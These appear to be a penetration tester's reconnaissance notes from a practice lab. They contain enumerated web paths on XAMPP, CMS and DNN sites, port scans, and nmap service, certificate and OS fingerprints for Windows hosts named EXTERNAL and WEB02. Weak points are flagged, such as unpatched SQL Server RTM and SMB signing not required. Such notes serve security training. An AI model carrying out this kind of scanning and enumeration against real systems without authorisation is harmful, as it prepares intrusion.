http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.pdf
http://192.168.146.249:8000/dashboard/docs/deploy-git-app.pdf
http://192.168.146.249:8000/dashboard/docs/activate-use-xdebug.pdf
http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf2.pdf
http://192.168.146.249:8000/dashboard/docs/troubleshoot-apache.pdf
http://192.168.146.249:8000/dashboard/Images/fastly-logo@2x.png
http://192.168.146.249:8000/dashboard/Images/xampp-cloud.png
http://192.168.146.249:8000/dashboard/Images/social-icons-large.png
http://192.168.146.249:8000/dashboard/Images/favicon.png
http://192.168.146.249:8000/dashboard/Images/background.png
http://192.168.146.249:8000/dashboard/Images/xampp-logo.svg
http://192.168.146.249:8000/dashboard/Images/bitnami-xampp.png
http://192.168.146.249:8000/dashboard/Images/pdf-icon.png
http://192.168.146.249:8000/dashboard/Images/sourceforge-logo.png
http://192.168.146.249:8000/dashboard/Images/windows-logo.png
http://192.168.146.249:8000/dashboard/Images/middleman.png
http://192.168.146.249:8000/dashboard/Images/social-icons.png
http://192.168.146.249:8000/dashboard/Images/addons-video-thumb.png
http://192.168.146.249:8000/dashboard/Images/apple-logo.png
http://192.168.146.249:8000/dashboard/Images/stack-icons.png
http://192.168.146.249:8000/dashboard/Images/social-icons@2x.png
http://192.168.146.249:8000/dashboard/Images/linux-logo.png
http://192.168.146.249:8000/dashboard/Images/xampp-newsletter-logo.png
http://192.168.146.249:8000/dashboard/Images/fastly-logo.png
http://192.168.146.249:8000/dashboard/Images/sourceforge-logo@2x.png
http://192.168.146.249:8000/dashboard/Images/social-icons-large@2x.png
http://192.168.146.249:8000/dashboard/Images/stack-icons@2x.png
http://192.168.146.249:8000/dashboard/Images/xampp-cloud@2x.png
http://192.168.146.249:8000/dashboard/Images/twitter-bird.png
http://192.168.146.249:8000/dashboard/
http://192.168.146.249:8000/dashboard/javascripts/modernizr.js
http://192.168.146.249:8000/dashboard/javascripts/all.js
http://192.168.146.249:8000/dashboard/es/
http://192.168.146.249:8000/dashboard/it/
http://192.168.146.249:8000/dashboard/fr/
http://192.168.146.249:8000/dashboard/pl/
http://192.168.146.249:8000/dashboard/tr/
http://192.168.146.249:8000/cms/
http://192.168.146.249:8000/dashboard/jp/
http://192.168.146.249:8000/dashboard/Docs/use-php-fcgi.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/change-mysql-temp-dir.html
http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.html
http://192.168.146.249:8000/dashboard/Docs/install-wordpress.html
http://192.168.146.249:8000/dashboard/Docs/send-mail.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/deploy-git-app.html
http://192.168.146.249:8000/dashboard/Docs/activate-use-xdebug.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/configure-wildcard-subdomains.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/reset-mysql-password.html
http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf2.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/troubleshoot-apache.html
http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf1.pdf
http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.pdf
http://192.168.146.249:8000/dashboard/Docs/use-sqlite.pdf
http://192.168.146.249:8000/dashboard/Docs/backup-restore-mysql.html
http://192.168.146.249:8000/dashboard/Docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/install-wordpress.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/send-mail.pdf
http://192.168.146.249:8000/dashboard/Docs/activate-use-xdebug.html
http://192.168.146.249:8000/dashboard/Docs/reset-mysql-password.pdf
http://192.168.146.249:8000/dashboard/Docs/change-mysql-temp-dir.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/use-php-fcgi.html
http://192.168.146.249:8000/dashboard/Docs/deploy-git-app.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf1.pdfmarks
http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf2.html
http://192.168.146.249:8000/dashboard/Docs/transfer-files-ftp.pdf
http://192.168.146.249:8000/Dashboard/images/linux-logo.png
http://192.168.146.249:8000/Dashboard/images/fastly-logo.png
http://192.168.146.249:8000/Dashboard/images/background.png
http://192.168.146.249:8000/Dashboard/images/fastly-logo@2x.png
http://192.168.146.249:8000/Dashboard/images/pdf-icon.png
http://192.168.146.249:8000/Dashboard/images/favicon.png
http://192.168.146.249:8000/Dashboard/images/xampp-logo.svg
http://192.168.146.249:8000/Dashboard/images/social-icons-large@2x.png
http://192.168.146.249:8000/Dashboard/images/xampp-newsletter-logo.png
http://192.168.146.249:8000/Dashboard/images/sourceforge-logo@2x.png
http://192.168.146.249:8000/Dashboard/images/apple-logo.png
http://192.168.146.249:8000/Dashboard/images/middleman.png
http://192.168.146.249:8000/Dashboard/images/social-icons.png
http://192.168.146.249:8000/Dashboard/images/windows-logo.png
http://192.168.146.249:8000/Dashboard/images/sourceforge-logo.png
http://192.168.146.249:8000/Dashboard/images/stack-icons@2x.png
http://192.168.146.249:8000/Dashboard/images/stack-icons.png
http://192.168.146.249:8000/Dashboard/images/xampp-cloud.png
http://192.168.146.249:8000/Dashboard/images/twitter-bird.png
http://192.168.146.249:8000/Dashboard/docs/troubleshoot-apache.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/use-php-fcgi.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/auto-start-xampp.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.html
http://192.168.146.249:8000/Dashboard/docs/send-mail.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/use-sqlite.html
http://192.168.146.249:8000/Dashboard/docs/configure-wildcard-subdomains.html
http://192.168.146.249:8000/Dashboard/docs/backup-restore-mysql.html
http://192.168.146.249:8000/Dashboard/docs/increase-php-file-upload-limit.pdf
http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/use-different-php-version.pdf
http://192.168.146.249:8000/Dashboard/docs/configure-use-tomcat.html
http://192.168.146.249:8000/Dashboard/docs/deploy-git-app.html
http://192.168.146.249:8000/Dashboard/docs/send-mail.pdf
http://192.168.146.249:8000/Dashboard/docs/configure-vhosts.pdf
http://192.168.146.249:8000/Dashboard/docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/configure-use-tomcat.pdfmarks
http://192.168.146.249:8000/Dashboard/docs/troubleshoot-apache.html
http://192.168.146.249:8000/Dashboard/docs/transfer-files-ftp.pdf
http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.pdf
http://192.168.146.249:8000/Dashboard/stylesheets/normalize.css
http://192.168.146.249:8000/Dashboard/stylesheets/asciidoctor.css
http://192.168.146.249:8000/Dashboard/stylesheets/all.css
http://192.168.146.249:8000/Dashboard/stylesheets/all-rtl.css
http://192.168.146.249:8000/Dashboard/de/
http://192.168.146.249:8000/Dashboard/Images/Blog/phpinfo-section-1.png
http://192.168.146.249:8000/cms/.DS_Store
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-3.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-manager.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-10.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/download-xampp-vm.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-php-output.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-11.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-1.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-volumes.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-general.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-7.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-5.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-9.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-6.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/phpinfo-section-1.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-4.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/phpinfo-section-2.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-php-finder.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/heartbleed-affected.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-2.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-tray.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-8.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/heartbleed-affected-osx.png
http://192.168.146.249:8000/Dashboard/IMAGES/blog/
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-php-output.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-volumes.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-4.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-6.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-5.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-9.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-1.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-tray.png
http://192.168.146.249:8000/Dashboard/Images/BLOG/heartbleed-affected-osx.png
http://192.168.146.249:8000/cms/media/.ds_store
http://192.168.146.249:8000/Dashboard/zh_tw/
```
## 248 EXTERNAL
### open ports
```
Open 192.168.102.248:80
Open 192.168.102.248:135
Open 192.168.102.248:139
Open 192.168.102.248:445
Open 192.168.102.248:3389
Open 192.168.102.248:5985
Open 192.168.102.248:47001
Open 192.168.102.248:49664
Open 192.168.102.248:49665
Open 192.168.102.248:49670
Open 192.168.102.248:49668
Open 192.168.102.248:49669
Open 192.168.102.248:49666
Open 192.168.102.248:49667
Open 192.168.102.248:49965
```
### port details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 2DE6897008EB657D2EC770FE5B909439
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries 
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
| /Documentation/ /HttpModules/ /Install/ /Providers/ 
|_/Activity-Feed/userId/
|_http-title: Home
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=EXTERNAL
| Issuer: commonName=EXTERNAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:07
| Not valid after:  2026-02-16T15:04:07
| MD5:   6964:ce43:5fcf:ccd6:1c7f:7819:6007:1c48
| SHA-1: d482:3b4e:682b:b5ce:6eb4:3531:fad5:8ec6:f38c:9c4a
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQcIFyiLewjoxIKLFtYsRAVTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhFWFRFUk5BTDAeFw0yNTA4MTcxNTA0MDdaFw0yNjAyMTYxNTA0
| MDdaMBMxETAPBgNVBAMTCEVYVEVSTkFMMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAmtd6C6YvysouXiiw1nSMDUIMuFshpNpu1//KvawDEi6PloB+kS+n
| sjW8oa0URh8KYIbtLJ1CBBOW/X72SQONqCFMTY6XvmIkaExtmcpQkEvhOvDOlSLE
| 8A18CrEMfqnqIq5M+paNZm1YV2ESgYZVTGje/Y6dCmn6SVJEcB7pcIH4mRtBIB1w
| n1Ii/yjfM07apwycccxUFSJdievDu+aQmg9kZ/H5gKJvzUkDZTWlttqQFMHf9K3J
| bdw2j0Hmy+5i4B0tzIoJhgAxp4OMprV+giIUjdG77EdOxcFAZ7QFwKUn1fuyUcAn
| VdEr1aPgWVFCj4Z4KQjkQDEvd1HtzMBWlQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHnd+T6XRnh1
| eoprOQ24mDjdodQXjFJlSC/mq4NtbnR81IszfJ3rDg4LKSls6Ldvk2Cnp8J1CtTC
| 0uFhFxwpkRXpsrITuaLgMjw6TREE7R/n8VbM1C4X9DsftjAS52cl8tnhG/hiPezt
| ZfdDin9hF8utRFbv6ZN9sq1UCvZn+xXxihg1xR+3MpJQ6iY9hpLFC5t02WO6KS+E
| AIhr2TFQz+4O5ETnefDuTnTVtnAyPRjX+ICgqlp7OCB4A4pLsdAdHO3FjCESUP4S
| +B34XEsFJ6COamqTetYV3AxQi98lzt2jPOZvmpNqK9yQMP50qO5RPE+6GS0575Uh
| cguItsVzo/8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:08:17+00:00
|_ssl-date: 2025-08-18T15:08:25+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49965/tcp open  ms-sql-s      syn-ack ttl 125 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.102.248:49965: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49965
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T13:19:45
| Not valid after:  2054-09-17T13:19:45
| MD5:   6a54:139e:be8d:8272:c6b2:4531:c5d2:6827
| SHA-1: a3f8:6818:cee2:4292:994c:3931:ce8d:8af1:2cd3:b456
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQepLa93u5dZtFW2YSsUN5gjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQwOTE3MTMxOTQ1WhgPMjA1NDA5MTcxMzE5NDVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK7KwA4a
| yTmnNsNCtGGP6fj6Vv0Gu6pToiCNGmEhM9Pxg1HUOsuO1r2lHBOoW1E5LV0gWOSR
| hhKsyN0wwE5v23O+bqJhCXsuJdX7WksloMGxR4AUzy8HXiQoPi6UGXoUQZPg39Yb
| AfnSkV23kVow0F7js1hpODzQEqzPo8a19eNNjoRatJA3BCLertYU+8nS3MIxm8fI
| 3O1ffNI1Ml+tUnXmsEV3Dep1JdU19+IWmfxuU1WJcYrdqEY5u17L1/2mHLEWSLDy
| 9bBX5r6kkIzTrYgL+bd4TflWDUMx4b2+e50eaRa/fU620yZB9+nWRBt3Yo77cwgN
| 3ImnZmAmrO3nMb0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAVAJv4yhUgppSwrIa
| 8U4v5e2r1yK8U6rA6C2cEyRvM9LZHulJWNoWeDDrSK64wYSX9n9HIMOshhup3R2I
| 9akTVsLbYk4IIdL1Liptexncs9ts6p2FZ7J1jUcEEPqlwiUWkcqG/Snfd5MddvYF
| hG8lNDCMh/7R8d3ImB+JhTwS1pLjpuNkHaywckNAZ4gYjVGdA2u+16mhf6eLd1+B
| ITCUt5ZrR+u2TCfZ6rAf4Q5K5LjzX7udSPYAfnBRwOzj+QnHjsSM6pnLUYnZehog
| /ptrfRct6/UIicYbp7fEhlB3ffgipD648bUFE3CdsRx7iUE68Wax+/q7cs20OBZU
| VhrQ/w==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   192.168.102.248:49965: 
|     Target_Name: EXTERNAL
|     NetBIOS_Domain_Name: EXTERNAL
|     NetBIOS_Computer_Name: EXTERNAL
|     DNS_Domain_Name: EXTERNAL
|     DNS_Computer_Name: EXTERNAL
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-08-18T15:08:25+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=33413%PV=Y%DS=4%DC=T%G=N%TM=68A341E9%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%TS=A)
SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.005 days (since Mon Aug 18 11:01:44 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39235/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15956/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36086/udp): CLEAN (Failed to receive data)
|   Check 4 (port 43580/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-08-18T15:08:21
|_  start_date: N/A

```
### froxbuster
```
http://192.168.146.248/js/dnn.modalpopup.js
http://192.168.146.248/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.bootstrap.js
http://192.168.146.248/Resources/Search/SearchSkinObjectPreview.js
http://192.168.146.248/Portals/_default/Skins/Xcillion/css/jquery.smartmenus.bootstrap.css
http://192.168.146.248/Portals/_default/Skins/Xcillion/js/scripts.js
http://192.168.146.248/js/dnn.servicesframework.js
http://192.168.146.248/Resources/libraries/jQuery-Migrate/03_04_00/jquery-migrate.js
http://192.168.146.248/Portals/_default/Skins/Xcillion/Menus/MainMenu/MainMenu.css
http://192.168.146.248/Resources/Search/SearchSkinObjectPreview.css
http://192.168.146.248/Portals/0/Images/logo.png
http://192.168.146.248/Portals/0/home.css
http://192.168.146.248/js/dnncore.js
http://192.168.146.248/DesktopModules/Admin/Authentication/module.css
http://192.168.146.248/Resources/Shared/Scripts/jquery/jquery.hoverIntent.min.js
http://192.168.146.248/Portals/_default/Skins/Xcillion/skin.css
http://192.168.146.248/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.js
http://192.168.146.248/js/dnn.js
http://192.168.146.248/portals/0/Images/logo2.png
http://192.168.146.248/Portals/_default/Skins/Xcillion/bootstrap/js/bootstrap.min.js
http://192.168.146.248/Portals/_default/Skins/Xcillion/bootstrap/css/bootstrap.min.css
http://192.168.146.248/Resources/libraries/jQuery/03_05_01/jquery.js
http://192.168.146.248/Privacy
http://192.168.146.248/Resources/Shared/stylesheets/dnndefault/7.0.0/default.css
http://192.168.146.248/Resources/Shared/Scripts/dnn.jquery.js
http://192.168.146.248/Resources/libraries/jQuery-UI/01_13_02/jquery-ui.min.js
http://192.168.146.248/Login
http://192.168.146.248/Terms
http://192.168.146.248/Home/ctl/SendPassword
http://192.168.146.248/login
http://192.168.146.248/
http://192.168.146.248/privacy
http://192.168.146.248/terms
http://192.168.146.248/Search-Results
http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/dnn.combobox.js
http://192.168.146.248/Resources/libraries/Selectize/00_12_06/selectize.min.js
http://192.168.146.248/Portals/_default/Skins/_default/WebControlSkin/Default/DropDownList.default.css
http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/selectize.default.css
http://192.168.146.248/search-results
http://192.168.146.248/DesktopModules/admin/SearchResults/dnn.searchResult.js
http://192.168.146.248/Resources/Shared/scripts/dnn.searchBox.js
http://192.168.146.248/DesktopModules/Admin/SearchResults/module.css
http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/selectize.css
http://192.168.146.248/Resources/Shared/stylesheets/dnn.searchBox.css
http://192.168.146.248/Host/ctl/Login/portalid/0
Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
http://192.168.146.248/Host/ctl/Login/Terms-Of-Use
http://192.168.146.248/Host/ctl/Login/Test3
http://192.168.146.248/Host/ctl/Login/TestArea
http://192.168.146.248/Host/ctl/Login/TestErrorPage
http://192.168.146.248/Host/ctl/Login/TestMail
http://192.168.146.248/404-error-page
http://192.168.146.248/Host/ctl/Login/commentrss
http://192.168.146.248/404-Error-Page
http://192.168.146.248/PRIVACY
http://192.168.146.248/TERMS
```
## 247 WEB02
### open ports
```
Open 192.168.102.247:80
Open 192.168.102.247:135
Open 192.168.102.247:139
Open 192.168.102.247:445
Open 192.168.102.247:443
Open 192.168.102.247:3389
Open 192.168.102.247:5985
Open 192.168.102.247:14020
Open 192.168.102.247:14080
Open 192.168.102.247:47001
Open 192.168.102.247:49668
Open 192.168.102.247:49665
Open 192.168.102.247:49664
Open 192.168.102.247:49666
Open 192.168.102.247:49669
Open 192.168.102.247:49667
Open 192.168.102.247:49670
```
### port details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: RELIA - New Hire Information
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-title: RELIA - New Hire Information
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Issuer: commonName=WEB02
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:08
| Not valid after:  2026-02-16T15:04:08
| MD5:   f1a4:69c0:4953:c62f:dbbd:5998:1e7b:c014
| SHA-1: d335:8eb5:c280:4ee0:0f1d:6924:7b73:d4d2:74f9:388a
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQQJgEqB64oLRFcuaMxg4BtDANBgkqhkiG9w0BAQsFADAQ
| MQ4wDAYDVQQDEwVXRUIwMjAeFw0yNTA4MTcxNTA0MDhaFw0yNjAyMTYxNTA0MDha
| MBAxDjAMBgNVBAMTBVdFQjAyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEA1NS8WlmVK26wsrgC5F827dViX98fyabfdMWGHW5G5DwNv0+e9h96Tk0cb3oy
| Pn3gitU5EURuF7ls4WN6YJY/GZq1OqVM8UMm7tgq0chQUkzMCljrOrLizYLB1gF7
| W0Fel0s8mvoaer/xHXHZujO15R0xysopWY7CXoYRmnhTZG4Rc2Qr7Y7/UsRnTOeL
| cRldocX/4/WPcFXsc9CPa5psnZ42OLoQvoH/e2RvbIvLmPtxi1283eqj7mZn/otv
| oZz7Cvhlve0vlOeUZKEEzUMlc8CnMbgdJCJoln0UszuZrwg4wxWW8gbcQvZ8bCER
| TegAAGuL/+AP+c7N/Ox+fSdLFQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADcxfd8qHruYyg3kYtFW
| FYjYKI3qvGyZeT5K1aYI9RlNun4yvBvZpKoqTfAC3XxyTKF974xB35+MWCc5ItMd
| 4oeIpJSa6nOLy7bFsMd91qeHVvdviWFIxZdgfYKy/PVqLXe8EdV3eiAoSStpdYzk
| PKcNPhEO7fmNNRZio/Y1+XZbXpLxhB5M1ZoEvvhqi4PW70PoHgWMBN2ldEMu9Y5/
| LzMZ4pa8y/SQXoQaylUavOh3Bhvl7CpSfd8kOcRbKMavQ0i5ZY/bZGOZ/r+K1r0e
| 9lzB1rbeiTgU+9L2Of/P780LS8lNOu3q6zUolqGzx1YtTM1fC3UA4Ii2gffDj+wQ
| Cjc=
|_-----END CERTIFICATE-----
